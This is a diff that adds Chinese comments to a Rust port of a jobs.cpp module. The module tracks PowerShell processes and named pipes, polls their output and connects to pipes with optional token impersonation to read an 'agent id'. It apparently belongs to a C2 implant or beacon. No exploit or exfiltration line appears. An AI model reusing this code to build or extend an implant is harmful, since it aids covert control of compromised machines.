@@ -1,3 +1,4 @@
+//! 作业跟踪（jobs.cpp）。
 //! Job tracking (jobs.cpp).
 
 use crate::bformat::FormatP;
@@ -27,6 +28,8 @@ pub const JOB_STATUS_DEAD: i16 = 1;
 
 pub const JOB_DESCRIPTION_LENGTH: usize = 64;
 
+/// 与 C 的 `psh_entry` 对应的 `PshEntry`。句柄字段用 `isize` 以便结构体实现 `Send`
+/// （C 结构体存的是原始 HANDLE；数值相同）。
 /// `PshEntry` — like the C `psh_entry`. Handle fields are `isize` so the
 /// struct is `Send` (the C struct stores raw HANDLEs; the values are the
 /// same).
@@ -48,6 +51,7 @@ pub struct PshEntry {
 static PSH_LIST: Mutex<Vec<PshEntry>> = Mutex::new(Vec::new());
 static JIDS: Mutex<u32> = Mutex::new(0);
 
+/// 清理进程句柄。
 /// Clean up process handles.
 pub fn cleanup_process(pi: &PROCESS_INFORMATION) {
     unsafe {
@@ -60,15 +64,17 @@ pub fn cleanup_process(pi: &PROCESS_INFORMATION) {
     }
 }
 
+/// 跟踪一个正在运行的 powershell 进程。
 /// Track a running powershell process.
 pub fn psh_track(pi: &PROCESS_INFORMATION, read_stdout: isize, write_stdout: isize) {
     let entry = process_track(pi, read_stdout, write_stdout, b"process");
     let mut list = PSH_LIST.lock();
     if let Some(e) = list.iter_mut().find(|e| e.jid == entry.jid) {
-        e.rtype = CALLBACK_OUTPUT_OEM; // cmd.exe/powershell.exe use OEM encoding
+        e.rtype = CALLBACK_OUTPUT_OEM; // cmd.exe/powershell.exe 使用 OEM 编码 / cmd.exe/powershell.exe use OEM encoding
     }
 }
 
+/// 跟踪任意一个正在运行的进程。
 /// Track an arbitrary running process.
 pub fn process_track(
     pi: &PROCESS_INFORMATION,
@@ -99,6 +105,7 @@ pub fn process_track(
     list.last().cloned().unwrap()
 }
 
+/// 跟踪一个命名管道。
 /// Track a named pipe.
 pub fn pipe_track(read_stdout: isize, pid: u32, rtype: i32, description: &[u8], mode: i16) {
     let mut entry = PshEntry {
@@ -121,6 +128,7 @@ pub fn pipe_track(read_stdout: isize, pid: u32, rtype: i32, description: &[u8], 
 
 fn psh_prune_list() {
     let mut list = PSH_LIST.lock();
+    // 清理死条目
     // cleanup dead entries
     for temp in list.iter() {
         if temp.status == JOB_STATUS_DEAD {
@@ -137,10 +145,12 @@ fn psh_prune_list() {
             }
         }
     }
+    // 剪除（清除死条目）
     // prune
     list.retain(|e| e.status != JOB_STATUS_DEAD);
 }
 
+/// 轮询任何正在运行的 powershell 进程的输出并上报。
 /// Poll any running powershell processes for output and report it.
 pub fn psh_poll(callback: Callback, max: usize) {
     let mut bufferz = vec![0u8; max];
@@ -159,12 +169,14 @@ pub fn psh_poll(callback: Callback, max: usize) {
                 callback(&bufferz[..total_read as usize], total_read, temp.rtype);
             }
 
+            // 检查管道是否还活着
             // check if the pipe is alive or not
             if temp.tag == JOB_ENTRY_NAMEDPIPE && total_read == -1 {
                 temp.status = JOB_STATUS_DEAD;
             } else if temp.tag == JOB_ENTRY_PROCESS
                 && unsafe { WaitForSingleObject(temp.h_process as HANDLE, 0) } == WAIT_TIMEOUT
             {
+                // 进程存活
                 // alive
             } else if temp.tag == JOB_ENTRY_PROCESS
                 && unsafe { WaitForSingleObject(temp.h_process as HANDLE, 0) } != WAIT_TIMEOUT
@@ -173,6 +185,7 @@ pub fn psh_poll(callback: Callback, max: usize) {
             }
 
             if temp.status == JOB_STATUS_DEAD {
+                // 这里无需额外处理；psh_prune_list 会负责清理
                 // nothing extra to do here; psh_prune_list handles cleanup
             }
         }
@@ -181,6 +194,7 @@ pub fn psh_poll(callback: Callback, max: usize) {
     bufferz.fill(0);
     drop(bufferz);
 
+    // 处理死条目
     // process dead entries
     psh_prune_list();
 }
@@ -188,20 +202,24 @@ pub fn psh_poll(callback: Callback, max: usize) {
 pub fn read_blob_from_pipe(handle: isize, buffer: &mut [u8], maxlength: usize) -> i32 {
     unsafe {
         let mut avail: u32 = 0;
+        // -1 表示管道已关闭
         // -1 means the pipe closed
         if PeekNamedPipe(handle as HANDLE, std::ptr::null_mut(), 0, std::ptr::null_mut(), &mut avail, std::ptr::null_mut()) == 0 {
             return -1;
         }
+        // 0 表示管道还活着，但没有数据
         // 0 means we're alive, but no data
         if avail <= 0 {
             return 0;
         }
+        // 读取我们的长度（4 字节）吧
         // read our length plz
         let mut get: i32 = 0;
         let rlen = read_all(handle, &mut get as *mut i32 as *mut u8, 4);
         if rlen == -1 || rlen != 4 {
             return -1;
         }
+        // 校验 get 值是否合理
         // sanity check our get value
         if get as usize > maxlength {
             return -1;
@@ -235,6 +253,7 @@ pub fn read_all_from_pipe(handle: isize, buffer: &mut [u8], maxlength: usize) ->
     }
 }
 
+/// 从句柄精确读取 `size` 个字节（对应 C++ 中的 read_all）。
 /// Read exactly `size` bytes from a handle (read_all in the C++).
 pub fn read_all(handle: isize, buffer: *mut u8, size: usize) -> i32 {
     unsafe {
@@ -280,6 +299,7 @@ fn _connect_pipe_level(pipename: &[u8], pipe: &mut isize, _level: u32) -> bool {
             }
         }
 
+        // 恭喜……已连接。读取一个 agent id
         // congrats.. we're connected. read an agent id
         let mut mode: u32 = PIPE_READMODE_BYTE;
         let status = SetNamedPipeHandleState(*pipe as HANDLE, &mode, std::ptr::null_mut(), std::ptr::null_mut());
@@ -292,6 +312,7 @@ fn _connect_pipe_level(pipename: &[u8], pipe: &mut isize, _level: u32) -> bool {
     }
 }
 
+/// 连接管道，并较为优雅地处理令牌丢弃/不丢弃。
 /// Connect to a pipe, handling token drop / no-drop with some grace.
 pub fn connect_pipe_level(pipename: &[u8], pipe: &mut isize, level: u32) -> bool {
     if level == SECURITY_ANONYMOUS {
@@ -308,11 +329,13 @@ pub fn connect_pipe_level(pipename: &[u8], pipe: &mut isize, level: u32) -> bool
     }
 }
 
+/// 默认应始终为 SECURITY_ANONYMOUS。
 /// Default should always be SECURITY_ANONYMOUS.
 pub fn connect_pipe(pipename: &[u8], pipe: &mut isize) -> bool {
     connect_pipe_level(pipename, pipe, SECURITY_ANONYMOUS)
 }
 
+/// 最多等待 [wait] 毫秒，直到该管道出现数据。
 /// Wait for up to [wait] ms for data to appear in this pipe.
 pub fn pipe_try(handle: isize, wait: u32) {
     let stopat = unsafe { windows_sys::Win32::System::SystemInformation::GetTickCount() } + wait;
@@ -347,6 +370,7 @@ pub fn command_job_register(buffer: &[u8], length: usize, impersonate: bool, mod
 
     let level = if impersonate { SECURITY_IMPERSONATION } else { SECURITY_ANONYMOUS };
 
+    // 最多尝试 20 次（500ms × 20 = 10s 阻塞）连接管道
     // try up to 20x (500ms = 10s block) to connect to pipe
     for _ in 0..20 {
         let mut phandle: isize = 0;
